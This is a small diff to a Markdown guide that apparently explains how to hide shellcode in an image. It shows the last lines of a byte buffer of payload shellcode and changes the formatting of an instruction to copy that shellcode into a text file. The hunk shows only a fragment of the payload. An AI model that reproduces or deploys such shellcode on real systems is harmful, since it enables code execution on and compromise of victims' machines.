@@ -32,7 +32,7 @@ buf += b"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
 buf += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
 buf += b"\x89\xda\xff\xd5"
 ```
-Copy the contents of the shellcode, like above, into a text file and save it! Please ensure the first line, 'buf = b""', is included.
+Copy the contents of the shellcode, like above, into a text file and save it! Please ensure the first line, `buf = b""`, is included.
 
 ### Picking an image
 
